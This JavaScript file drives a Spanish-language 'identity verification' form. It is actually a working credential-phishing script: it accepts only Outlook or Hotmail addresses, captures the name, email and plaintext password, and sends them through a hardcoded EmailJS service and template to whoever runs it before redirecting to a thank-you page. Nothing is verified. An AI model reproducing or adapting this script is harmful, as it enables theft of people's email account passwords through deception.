emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formularioVerificacion').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const boton = document.querySelector('.boton-verificacion');
    boton.disabled = true;
    boton.innerHTML = `<div class="spinner"></div>Verificando...`;

    const datos = {
        nombre: document.getElementById('nombre').value.trim(),
        email: document.getElementById('email').value.trim(),
        password: document.getElementById('password').value,
        fecha: new Date().toLocaleString('es-ES')
    };

    // Validar correo
    if (!/(outlook|hotmail)\./i.test(datos.email)) {
        alert('❌ Solo correos Outlook/Hotmail permitidos');
        boton.disabled = false;
        boton.innerHTML = `<span class="texto-boton">Verificar Identidad</span><span class="icono-boton">🌸</span>`;
        return;
    }

    try {
        await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
        window.location.href = "thank-you.html";
    } catch (error) {
        alert('Error temporal. Intenta nuevamente.');
    } finally {
        boton.disabled = false;
        boton.innerHTML = `<span class="texto-boton">Verificar Identidad</span><span class="icono-boton">🌸</span>`;
    }
});
